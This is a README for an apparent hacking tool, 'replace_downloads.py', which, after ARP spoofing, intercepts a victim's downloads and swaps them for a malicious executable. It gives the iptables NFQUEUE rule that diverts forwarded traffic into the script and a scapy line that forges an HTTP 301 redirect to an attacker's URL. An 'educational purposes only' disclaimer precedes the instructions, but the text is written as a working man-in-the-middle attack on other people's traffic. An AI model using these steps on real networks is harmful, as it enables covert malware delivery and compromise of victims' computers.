# Replace downloads

**DISCLAIMER**

All content posted on the repository is for educational and research purposes only. Do not attempt to 
violate the law with anything contained here. Administrators of this server, the authors of this material, 
or anyone else affiliated in any way, are not going to accept responsibility for your actions. Neither 
the creator nor GitHub is not responsible for the comments posted on this repository.

This site contains materials that can be potentially damaging or dangerous. 
If you do not fully understand please LEAVE THIS WEBSITE. Also, be sure to check laws 
in your province/country before accessing repository.

Note: In order to be a man-in-the-middle, you need to execute the ARP spoof script

replace_downloads.py sniff data that flows from the victim to websites. Websites response to the hacker machine
and the hacker changes the download, ex. pastes malicious executable.

As you may guess, we need to insert an iptables rule, open the linux terminal and type:

```
iptables -I FORWARD -j NFQUEUE --queue-num 0
```

Moreover, it it important to change the response to HTTP/1.1 301 and add malicious url.

```
set_load(scapy_packet, bytes("HTTP/1.1 301 Moved Permanently\nLocation: " + url + "\n\n", "utf-8"))
```